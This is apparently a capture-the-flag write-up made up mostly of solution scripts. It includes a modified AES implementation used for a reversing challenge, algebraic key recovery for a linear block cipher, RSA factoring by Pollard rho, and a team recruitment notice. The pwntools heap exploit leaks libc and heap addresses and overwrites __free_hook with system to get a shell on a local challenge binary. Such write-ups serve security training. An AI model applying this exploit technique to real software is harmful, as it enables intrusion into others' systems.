  (*state)[0][3] = (*state)[1][3];
  (*state)[1][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[3][3];
  (*state)[3][3] = temp;
}
#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)

// Cipher is the main function that encrypts the PlainText.
static void Cipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(0, state, RoundKey);

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr rounds are executed in the loop below.
  // Last one without MixColumns()
  for (round = 1; round < 10 ; ++round)
  {
    SubBytes(state);
    MixColumns(state);
    ShiftRows(state);
    AddRoundKey(round, state, RoundKey);
  }
  // Add round key to last round
  SubBytes(state);
  ShiftRows(state);

  AddRoundKey(Nr, state, RoundKey);
}

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
static void InvCipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(Nr, state, RoundKey);

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr rounds are executed in the loop below.
  // Last one without InvMixColumn()
  InvShiftRows(state);
  InvSubBytes(state);

  for (round = (Nr - 1);round > 0; --round)
  {
      printf("%dn", round);

    AddRoundKey(round, state, RoundKey);

    InvShiftRows(state);
    InvMixColumns(state);
    InvSubBytes(state);

  }
  AddRoundKey(0, state, RoundKey);

}
#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)

/*****************************************************************************/
/* Public functions:                                                         */
/*****************************************************************************/
#if defined(ECB) && (ECB == 1)

void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call encrypts the PlainText with the Key using AES algorithm.
  Cipher((state_t*)buf, ctx->RoundKey);
}

void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call decrypts the PlainText with the Key using AES algorithm.
  InvCipher((state_t*)buf, ctx->RoundKey);
}

#endif // #if defined(ECB) && (ECB == 1)

#if defined(CBC) && (CBC == 1)

static void XorWithIv(uint8_t* buf, const uint8_t* Iv)
{
  uint8_t i;
  for (i = 0; i < AES_BLOCKLEN; ++i) // The block in AES is always 128bit no matter the key size
  {
    buf[i] ^= Iv[i];
  }
}

void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)
{
  size_t i;
  uint8_t *Iv = ctx->Iv;
  for (i = 0; i < length; i += AES_BLOCKLEN)
  {
    XorWithIv(buf, Iv);
    Cipher((state_t*)buf, ctx->RoundKey);
    Iv = buf;
    buf += AES_BLOCKLEN;
  }
  /* store Iv in ctx for next call */
  memcpy(ctx->Iv, Iv, AES_BLOCKLEN);
}

void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
{
  size_t i;
  uint8_t storeNextIv[AES_BLOCKLEN];
  for (i = 0; i < length; i += AES_BLOCKLEN)
  {
    memcpy(storeNextIv, buf, AES_BLOCKLEN);
    InvCipher((state_t*)buf, ctx->RoundKey);
    XorWithIv(buf, ctx->Iv);
    memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN);
    buf += AES_BLOCKLEN;
  }

}

#endif // #if defined(CBC) && (CBC == 1)

#if defined(CTR) && (CTR == 1)

/* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
{
  uint8_t buffer[AES_BLOCKLEN];
  
  size_t i;
  int bi;
  for (i = 0, bi = AES_BLOCKLEN; i < length; ++i, ++bi)
  {
    if (bi == AES_BLOCKLEN) /* we need to regen xor compliment in buffer */
    {
      
      memcpy(buffer, ctx->Iv, AES_BLOCKLEN);
      Cipher((state_t*)buffer,ctx->RoundKey);

      /* Increment Iv and handle overflow */
      for (bi = (AES_BLOCKLEN - 1); bi >= 0; --bi)
      {
 /* inc will overflow */
        if (ctx->Iv[bi] == 255)
 {
          ctx->Iv[bi] = 0;
          continue;
        } 
        ctx->Iv[bi] += 1;
        break;   
      }
      bi = 0;
    }

    buf[i] = (buf[i] ^ buffer[bi]);
  }
}

#endif // #if defined(CTR) && (CTR == 1)

aes.h

#ifndef _AES_H_
#define _AES_H_

#include <stdint.h>
#include <stddef.h>

// #define the macros below to 1/0 to enable/disable the mode of operation.
//
// CBC enables AES encryption in CBC-mode of operation.
// CTR enables encryption in counter-mode.
// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.

// The #ifndef-guard allows it to be configured before #include'ing or at compile time.
#ifndef CBC
  #define CBC 1
#endif

#ifndef ECB
  #define ECB 1
#endif

#ifndef CTR
  #define CTR 1
#endif

#define AES128 1
//#define AES192 1
//#define AES256 1

#define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only

#if defined(AES256) && (AES256 == 1)
    #define AES_KEYLEN 32
    #define AES_keyExpSize 240
#elif defined(AES192) && (AES192 == 1)
    #define AES_KEYLEN 24
    #define AES_keyExpSize 208
#else
    #define AES_KEYLEN 16   // Key length in bytes
    #define AES_keyExpSize 176
#endif

struct AES_ctx
{
  uint8_t RoundKey[AES_keyExpSize];
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
  uint8_t Iv[AES_BLOCKLEN];
#endif
};

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
#endif

#if defined(ECB) && (ECB == 1)
// buffer size is exactly AES_BLOCKLEN bytes; 
// you need only AES_init_ctx as IV is not used in ECB 
// NB: ECB is considered insecure for most uses
void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);

#endif // #if defined(ECB) && (ECB == !)

#if defined(CBC) && (CBC == 1)
// buffer size MUST be mutile of AES_BLOCKLEN;
// Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);

#endif // #if defined(CBC) && (CBC == 1)

#if defined(CTR) && (CTR == 1)

// Same function for encrypting as for decrypting. 
// IV is incremented for every block, and used after encryption as XOR-compliment for output
// Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);

#endif // #if defined(CTR) && (CTR == 1)

#endif // _AES_H_

aes.hpp

#ifndef _AES_HPP_
#define _AES_HPP_

#ifndef __cplusplus
#error Do not include the hpp header in a c project!
#endif //__cplusplus

extern "C" {
#include "aes.h"
}

#endif //_AES_HPP_

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from Crypto.Util.number import * 

cipher_text = [] 
perm_indices = [] 
BLOCK_SIZE = 64 
ROUNDS = 14 

# Inverse permutation list
inverse_permutation = [perm_indices.index(i) for i in range(BLOCK_SIZE)] 

# Constants for the mask and IV
MASK = 0b1110001001111001000110010000100010101111101100101110100001001001 
IV = 7 

# Helper functions
binary_to_integer = lambda bits: Integer(sum([bits[i] * 2**i for i in range(len(bits))])) 

# Create the permutation matrix
P_matrix = matrix(GF(2), BLOCK_SIZE, BLOCK_SIZE) 
for i, perm_index in enumerate(perm_indices): 
    P_matrix[i, perm_index] = 1 

# Permutation function
def permute(x): 
    bit_x = x.bits() 
    if len(bit_x) < BLOCK_SIZE: 
        bit_x.extend([0] * (BLOCK_SIZE - len(bit_x))) 
    bit_x = P_matrix * vector(GF(2), bit_x) 
    return binary_to_integer(vector(ZZ, bit_x).list()) 

# Inverse permutation function
def inverse_permute(x): 
    bit_x = x.bits() 
    if len(bit_x) < BLOCK_SIZE: 
        bit_x.extend([0] * (BLOCK_SIZE - len(bit_x))) 
    bit_x = P_matrix.inverse() * vector(GF(2), bit_x) 
    return binary_to_integer(vector(ZZ, bit_x).list()) 

# Define matrix A and vector b based on IV and MASK
A_matrix = matrix(GF(2), BLOCK_SIZE, BLOCK_SIZE) 
for i in range(BLOCK_SIZE): 
    A_matrix[i, i] = 1 
for i in range(BLOCK_SIZE): 
    j = i - IV 
    if j >= 0: 
        A_matrix[i, j] = 1 

b_vector = vector(GF(2), BLOCK_SIZE) 
for i in range(BLOCK_SIZE): 
    if (MASK >> i) & 1: 
        b_vector[i] = 1 

# Substitution function
def substitute(x): 
    bit_x = x.bits() 
    if len(bit_x) < BLOCK_SIZE: 
        bit_x.extend([0] * (BLOCK_SIZE - len(bit_x))) 
    bit_x = vector(GF(2), bit_x) 
    result = A_matrix * bit_x + b_vector 
    return binary_to_integer(vector(ZZ, result)) 

# Define matrix transformations for decryption
T_matrix = P_matrix.inverse() * A_matrix * P_matrix 
U_vector = P_matrix.inverse() * b_vector 
sum_T_matrix = sum(T_matrix**i for i in range(ROUNDS)) 

# Key recovery
recovered_keys = [] 
for i in range(1, 32): 
    cipher_bits = cipher_text[-1].bits() 
    while len(cipher_bits) != BLOCK_SIZE: 
        cipher_bits += [0] 
    cipher_bits = vector(GF(2), cipher_bits) 
    
    message_bytes = bytes([i]) * 8 
    message_bits = Integer(bytes_to_long(message_bytes)).bits() 
    while len(message_bits) != BLOCK_SIZE: 
        message_bits += [0] 
    message_bits = vector(GF(2), message_bits) 
    
    cipher_bits -= T_matrix**ROUNDS * message_bits 
    cipher_bits -= sum_T_matrix * U_vector 
    try:     
        P_inverse_key = sum_T_matrix.solve_right(cipher_bits) 
        key = P_matrix * P_inverse_key 
        recovered_key = sum([int(key[j]) * 2**j for j in range(len(key))]) 
        recovered_keys.append(recovered_key) 
    except: 
        pass 

# Decryption function
def decrypt_block(cipher_block, key): 
    cipher_bits = cipher_block.bits() 
    key_bits = key.bits() 
    while len(cipher_bits) != BLOCK_SIZE: 
        cipher_bits += [0] 
    while len(key_bits) != BLOCK_SIZE: 
        key_bits += [0] 
    cipher_bits = vector(GF(2), cipher_bits) 
    key_bits = vector(GF(2), key_bits) 
    
    cipher_bits -= sum_T_matrix * P_matrix.inverse() * key_bits 
    cipher_bits -= sum_T_matrix * U_vector 
    decrypted_bits = (T_matrix**ROUNDS).inverse() * cipher_bits 
    message_bytes = long_to_bytes(binary_to_integer(vector(ZZ, decrypted_bits))) 
    return message_bytes 

# Attempt decryption with each recovered key
for key in recovered_keys: 
    decrypted_message = [decrypt_block(c, key) for c in cipher_text] 
    flag = b"".join(decrypted_message) 
    print(flag)
```



```
import libnum
from Crypto.Util.number import *
e = 65537
n = 49025724928152491719950645039355675823887062840095001672970308684156817293484070166684235178364916522473822184239221170514602692903302575847326054102901449806271709230774063675539139201327878971370342483682454617270705142999317092151456200639975738970405158598235961567646064089356496022247689989925574384915789399433283855087561428970245448888799812611301566886173165074558800757040196846800189738355799057422298556992606146766063202605288257843684190291545600282197788724944382475099313284546776350595539129553760118549158103804149179701853798084612143809757187033897573787135477889183344944579834942896249251191453
with open("cipher.txt", "rb") as f:
    c = f.read()
    c = libnum.s2n(c)
def gcd(a, b):
    while b:
        a, b = b, a%b
    return a
def mapx(x):
    x=(pow(x,n-1,n)+3)%n
    return x
def pollard_rho (x1,x2):
    while True:
        x1=mapx(x1)
        x2=mapx(mapx(x2))
        p=gcd(x1-x2,n)
        if (p == n):
            print("fail")
            return
        elif (p != 1):
            q = n // p
            phi = (p - 1) * (q - 1)
            d = inverse(e, phi)
            print(long_to_bytes(pow(c, d, n)))
            break
pollard_rho(1, 1)
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')
def add(size,content):
        rl("Input your choice")
        sl(str(1))
        rl("Size :")
        sl(str(size))
        rl("Content :")
        s(content)
def free(i):
        rl("Input your choice")
        sl(str(2))
        rl("Index :")
        sl(str(i))
def show(i):
        rl("Input your choice")
        sl(str(4))
        rl("Index :")
        sl(str(i))
def edit(content):
        rl("Input your choice")
        sl(str(3))
        rl("content :")
        s(content)
 
add(0x98,b'a')
add(0x98,b'a')
add(0x98,b'a') #2
add(0x410,b'a')
add(0x98,b'a') #4
 
free(3)
add(0x410,b'a'*8) #5
show(5)
libc_base=get_addr()-2018272
li(hex(libc_base))
free_hook=libc_base+0x1eee48
system=libc_base+0x52290
free(5)
 
add(0x600,b'a')  #6
add(0x410,b'a'*0x10) #7
show(7)
rl("a"*0x10)
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x470
li(hex(heap_base))
 
add(0x140,b'/bin/shx00') #8
add(0x98,b'a') #9
add(0xa8,b'a') #10
add(0x98,b'a') #11
add(0xa8,b'a') #12
 
free(11)
free(0)
free(12)
free(10)
edit(p64(heap_base+0x290+8+5))
add(0x98,b'a')
add(0x98,b'a'*0x38+p64(0xb1)+p64(free_hook))
add(0xa8,b'a')
add(0xa8,p64(system))
 
free(8)
p.sendline(b"cat flag")
#print(p.recvline())
 
inter()
```



```
# print(key)
sbox = [0xED, 0xF6, 0xDC, 0x13, 0xA7, 0xB9, 0x3A, 0x75, 0x65, 0x45,
 0xA5, 0x9A, 0x1B, 0xC3, 0xE5, 0xAF, 0xBB, 0x6F, 0xAC, 0x69,
 0xF5, 0xB0, 0xE7, 0x8D, 0x9C, 0x55, 0x79, 0x24, 0xD5, 0xBD,
 0x06, 0xD0, 0xA9, 0x9F, 0x52, 0x10, 0x83, 0x0A, 0x72, 0x19,
 0x50, 0xF1, 0x5A, 0x99, 0x32, 0x73, 0x56, 0xCE, 0x2E, 0xD8,
 0xCB, 0x07, 0x63, 0xB8, 0xA1, 0x70, 0xF9, 0xE1, 0x3E, 0xCF,
 0xEB, 0xC2, 0xB3, 0xE8, 0xA0, 0x7F, 0xE0, 0xFD, 0x4F, 0x31,
 0x87, 0xA2, 0x95, 0xAD, 0x47, 0x0F, 0x90, 0x1E, 0x18, 0x86,
 0x0E, 0x27, 0x3C, 0x82, 0x1F, 0xFF, 0x17, 0x36, 0xBA, 0xF3,
 0xC5, 0x54, 0x96, 0x29, 0x04, 0x2B, 0x67, 0x33, 0x0D, 0x42,
 0xE9, 0xF2, 0x44, 0x0B, 0xEA, 0x51, 0xE3, 0x4D, 0xFC, 0x26,
 0xC7, 0x7E, 0x74, 0x91, 0xE6, 0x7A, 0xD9, 0x16, 0x30, 0xA8,
 0x57, 0x60, 0x8C, 0x21, 0x61, 0x5D, 0x76, 0x2F, 0x03, 0x64,
 0xB2, 0xA6, 0x8A, 0x8F, 0xB7, 0xEC, 0x1A, 0x7C, 0x88, 0xAE,
 0x39, 0xAA, 0x59, 0x66, 0x6D, 0x2A, 0xFA, 0x4A, 0x40, 0xC8,
 0xC0, 0x12, 0x98, 0x4C, 0x85, 0x6A, 0x05, 0x23, 0xDA, 0x43,
 0xD3, 0x84, 0x78, 0x3F, 0x6C, 0xD2, 0x6E, 0x68, 0x22, 0x9D,
 0xF4, 0x58, 0xB6, 0xA3, 0x62, 0x4E, 0x34, 0xD7, 0xF0, 0x53,
 0xB1, 0xC6, 0x77, 0x5F, 0x48, 0x7D, 0x5E, 0x08, 0xE2, 0x71,
 0x11, 0xDB, 0xFE, 0x81, 0xCD, 0xF7, 0x15, 0xEF, 0x01, 0x9B,
 0x3D, 0x28, 0xB4, 0x38, 0xBC, 0xD6, 0x41, 0x93, 0xDD, 0xBF,
 0x09, 0x92, 0xEE, 0xCC, 0xE4, 0x14, 0x8E, 0x5B, 0xBE, 0x7B,
 0x5C, 0xAB, 0x37, 0xDF, 0xFB, 0x6B, 0x2D, 0xC1, 0x8B, 0xC9,
 0xD1, 0x80, 0x2C, 0x94, 0x00, 0x25, 0x35, 0x4B, 0xD4, 0x3B,
 0x49, 0x02, 0xF8, 0xA4, 0x46, 0x1C, 0x89, 0x0C, 0x97, 0xDE,
 0x20, 0xCA, 0x9E, 0x1D, 0xC4, 0xB5]
rsbox = [0] * 256
for i in range(256):
 rsbox[sbox[i]] = i
print(rsbox)
```



```
#include <stdio.h>
#include "aes.hpp"

uint8_t Buf[48] = { };//密文 

int main()
{
 uint8_t key[16] = {
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
  0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10 };

 AES_ctx aes_ctx;
 // AES_init_ctx_iv(&aes_ctx, key, key);
 // AES_CBC_encrypt_buffer(&aes_ctx, Buf, 48);
 AES_init_ctx_iv(&aes_ctx, key, key);
 AES_CBC_decrypt_buffer(&aes_ctx, Buf, 48);

 printf("%sn", Buf);

}
```



```
/*

This is an implementation of the AES algorithm, specifically ECB, CTR and CBC mode.
Block size can be chosen in aes.h - available choices are AES128, AES192, AES256.

The implementation is verified against the test vectors in:
  National Institute of Standards and Technology Special Publication 800-38A 2001 ED

ECB-AES128
----------

  plain-text:
    6bc1bee22e409f96e93d7e117393172a
    ae2d8a571e03ac9c9eb76fac45af8e51
    30c81c46a35ce411e5fbc1191a0a52ef
    f69f2445df4f9b17ad2b417be66c3710

  key:
    2b7e151628aed2a6abf7158809cf4f3c

  resulting cipher
    3ad77bb40d7a3660a89ecaf32466ef97 
    f5d3d58503b9699de785895a96fdbaaf 
    43b1cd7f598ece23881b00e3ed030688 
    7b0c785e27e8ad3f8223207104725dd4 

NOTE:   String length must be evenly divisible by 16byte (str_len % 16 == 0)
        You should pad the end of the string with zeros if this is not the case.
        For AES192/256 the key size is proportionally larger.

*/

/*****************************************************************************/
/* Includes:                                                                 */
/*****************************************************************************/
#include <string.h> // CBC mode, for memset
#include "aes.h"

#include <stdio.h>

/*****************************************************************************/
/* Defines:                                                                  */
/*****************************************************************************/
// The number of columns comprising a state in AES. This is a constant in AES. Value=4
#define Nb 4

#if defined(AES256) && (AES256 == 1)
    #define Nk 8
    #define Nr 14
#elif defined(AES192) && (AES192 == 1)
    #define Nk 6
    #define Nr 12
#else
    #define Nk 4        // The number of 32 bit words in a key.
    #define Nr 10       // The number of rounds in AES Cipher.
#endif

// jcallan@github points out that declaring Multiply as a function 
// reduces code size considerably with the Keil ARM compiler.
// See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3
#ifndef MULTIPLY_AS_A_FUNCTION
  #define MULTIPLY_AS_A_FUNCTION 0
#endif

/*****************************************************************************/
/* Private variables:                                                        */
/*****************************************************************************/
// state - array holding the intermediate results during decryption.
typedef uint8_t state_t[4][4];

// The lookup-tables are marked const so they can be placed in read-only storage instead of RAM
// The numbers below can be computed dynamically trading ROM for RAM - 
// This can be useful in (embedded) bootloader applications, where ROM is often limited.
static const uint8_t sbox[256] = {
  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
 0xED, 0xF6, 0xDC, 0x13, 0xA7, 0xB9, 0x3A, 0x75, 0x65, 0x45,
  0xA5, 0x9A, 0x1B, 0xC3, 0xE5, 0xAF, 0xBB, 0x6F, 0xAC, 0x69,
  0xF5, 0xB0, 0xE7, 0x8D, 0x9C, 0x55, 0x79, 0x24, 0xD5, 0xBD,
  0x06, 0xD0, 0xA9, 0x9F, 0x52, 0x10, 0x83, 0x0A, 0x72, 0x19,
  0x50, 0xF1, 0x5A, 0x99, 0x32, 0x73, 0x56, 0xCE, 0x2E, 0xD8,
  0xCB, 0x07, 0x63, 0xB8, 0xA1, 0x70, 0xF9, 0xE1, 0x3E, 0xCF,
  0xEB, 0xC2, 0xB3, 0xE8, 0xA0, 0x7F, 0xE0, 0xFD, 0x4F, 0x31,
  0x87, 0xA2, 0x95, 0xAD, 0x47, 0x0F, 0x90, 0x1E, 0x18, 0x86,
  0x0E, 0x27, 0x3C, 0x82, 0x1F, 0xFF, 0x17, 0x36, 0xBA, 0xF3,
  0xC5, 0x54, 0x96, 0x29, 0x04, 0x2B, 0x67, 0x33, 0x0D, 0x42,
  0xE9, 0xF2, 0x44, 0x0B, 0xEA, 0x51, 0xE3, 0x4D, 0xFC, 0x26,
  0xC7, 0x7E, 0x74, 0x91, 0xE6, 0x7A, 0xD9, 0x16, 0x30, 0xA8,
  0x57, 0x60, 0x8C, 0x21, 0x61, 0x5D, 0x76, 0x2F, 0x03, 0x64,
  0xB2, 0xA6, 0x8A, 0x8F, 0xB7, 0xEC, 0x1A, 0x7C, 0x88, 0xAE,
  0x39, 0xAA, 0x59, 0x66, 0x6D, 0x2A, 0xFA, 0x4A, 0x40, 0xC8,
  0xC0, 0x12, 0x98, 0x4C, 0x85, 0x6A, 0x05, 0x23, 0xDA, 0x43,
  0xD3, 0x84, 0x78, 0x3F, 0x6C, 0xD2, 0x6E, 0x68, 0x22, 0x9D,
  0xF4, 0x58, 0xB6, 0xA3, 0x62, 0x4E, 0x34, 0xD7, 0xF0, 0x53,
  0xB1, 0xC6, 0x77, 0x5F, 0x48, 0x7D, 0x5E, 0x08, 0xE2, 0x71,
  0x11, 0xDB, 0xFE, 0x81, 0xCD, 0xF7, 0x15, 0xEF, 0x01, 0x9B,
  0x3D, 0x28, 0xB4, 0x38, 0xBC, 0xD6, 0x41, 0x93, 0xDD, 0xBF,
  0x09, 0x92, 0xEE, 0xCC, 0xE4, 0x14, 0x8E, 0x5B, 0xBE, 0x7B,
  0x5C, 0xAB, 0x37, 0xDF, 0xFB, 0x6B, 0x2D, 0xC1, 0x8B, 0xC9,
  0xD1, 0x80, 0x2C, 0x94, 0x00, 0x25, 0x35, 0x4B, 0xD4, 0x3B,
  0x49, 0x02, 0xF8, 0xA4, 0x46, 0x1C, 0x89, 0x0C, 0x97, 0xDE,
  0x20, 0xCA, 0x9E, 0x1D, 0xC4, 0xB5 };

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
static const uint8_t rsbox[256] = {
 234, 198, 241, 128, 94, 156, 30, 51, 187, 210, 37, 103, 247, 98, 80, 75, 35, 190, 151, 3, 215, 196, 117, 86, 78, 39, 136, 12, 245, 253, 77, 84, 250, 123, 168, 157, 27, 235, 109, 81, 201, 93, 145, 95, 232, 226, 48, 127, 118, 69, 44, 97, 176, 236, 87, 222, 203, 140, 6, 239, 82, 200, 58, 163, 148, 206, 99, 159, 102, 9, 244, 74, 184, 240, 147, 237, 153, 107, 175, 68, 40, 105, 34, 179, 91, 25, 46, 120, 171, 142, 42, 217, 220, 125, 186, 183, 121, 124, 174, 52, 129, 8, 143, 96, 167, 19, 155, 225, 164, 144, 166, 17, 55, 189, 38, 45, 112, 7, 126, 182, 162, 26, 115, 219, 137, 185, 111, 65, 231, 193, 83, 36, 161, 154, 79, 70, 138, 246, 132, 228, 122, 23, 216, 133, 76, 113, 211, 207, 233, 72, 92, 248, 152, 43, 11, 199, 24, 169, 252, 33, 64, 54, 71, 173, 243, 10, 131, 4, 119, 32, 141, 221, 18, 73, 139, 15, 21, 180, 130, 62, 202, 255, 172, 134, 53, 5, 88, 16, 204, 29, 218, 209, 150, 227, 61, 13, 254, 90, 181, 110, 149, 229, 251, 50, 213, 194, 47, 59, 31, 230, 165, 160, 238, 28, 205, 177, 49, 116, 158, 191, 2, 208, 249, 223, 66, 57, 188, 106, 214, 14, 114, 22, 63, 100, 104, 60, 135, 0, 212, 197, 178, 41, 101, 89, 170, 20, 1, 195, 242, 56, 146, 224, 108, 67, 192, 85 };
#endif

// The round constant word array, Rcon[i], contains the values given by 
// x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8)
static const uint8_t Rcon[11] = {
  0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };

/*
 * Jordan Goulder points out in PR #12 (https://github.com/kokke/tiny-AES-C/pull/12),
 * that you can remove most of the elements in the Rcon array, because they are unused.
 *
 * From Wikipedia's article on the Rijndael key schedule @ https://en.wikipedia.org/wiki/Rijndael_key_schedule#Rcon
 * 
 * "Only the first some of these constants are actually used – up to rcon[10] for AES-128 (as 11 round keys are needed), 
 *  up to rcon[8] for AES-192, up to rcon[7] for AES-256. rcon[0] is not used in AES algorithm."
 */

/*****************************************************************************/
/* Private functions:                                                        */
/*****************************************************************************/
/*
static uint8_t getSBoxValue(uint8_t num)
{
  return sbox[num];
}
*/
#define getSBoxValue(num) (sbox[(num)])

// This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. 
static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
{
  unsigned i, j, k;
  uint8_t tempa[4]; // Used for the column/row operations
  
  // The first round key is the key itself.
  for (i = 0; i < Nk; ++i)
  {
    RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];
    RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];
    RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];
    RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];
  }

  // All other round keys are found from the previous round keys.
  for (i = Nk; i < Nb * (Nr + 1); ++i)
  {
    {
      k = (i - 1) * 4;
      tempa[0]=RoundKey[k + 0];
      tempa[1]=RoundKey[k + 1];
      tempa[2]=RoundKey[k + 2];
      tempa[3]=RoundKey[k + 3];

    }

    if (i % Nk == 0)
    {
      // This function shifts the 4 bytes in a word to the left once.
      // [a0,a1,a2,a3] becomes [a1,a2,a3,a0]

      // Function RotWord()
      {
        const uint8_t u8tmp = tempa[0];
        tempa[0] = tempa[1];
        tempa[1] = tempa[2];
        tempa[2] = tempa[3];
        tempa[3] = u8tmp;
      }

      // SubWord() is a function that takes a four-byte input word and 
      // applies the S-box to each of the four bytes to produce an output word.

      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }

      tempa[0] = tempa[0] ^ Rcon[i/Nk];
    }
#if defined(AES256) && (AES256 == 1)
    if (i % Nk == 4)
    {
      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }
    }
#endif
    j = i * 4; k=(i - Nk) * 4;
    RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
    RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
    RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
    RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
  }
}

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)
{
  KeyExpansion(ctx->RoundKey, key);
}
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)
{
  KeyExpansion(ctx->RoundKey, key);
  memcpy (ctx->Iv, iv, AES_BLOCKLEN);
}
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)
{
  memcpy (ctx->Iv, iv, AES_BLOCKLEN);
}
#endif

// This function adds the round key to state.
// The round key is added to the state by an XOR function.
static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)
{
  uint8_t i,j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j];
    }
  }
}

// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void SubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[j][i] = getSBoxValue((*state)[j][i]);
    }
  }
}

// The ShiftRows() function shifts the rows in the state to the left.
// Each row is shifted with different offset.
// Offset = Row number. So the first row is not shifted.
static void ShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to left  
  temp           = (*state)[0][1];
  (*state)[0][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[2][1];
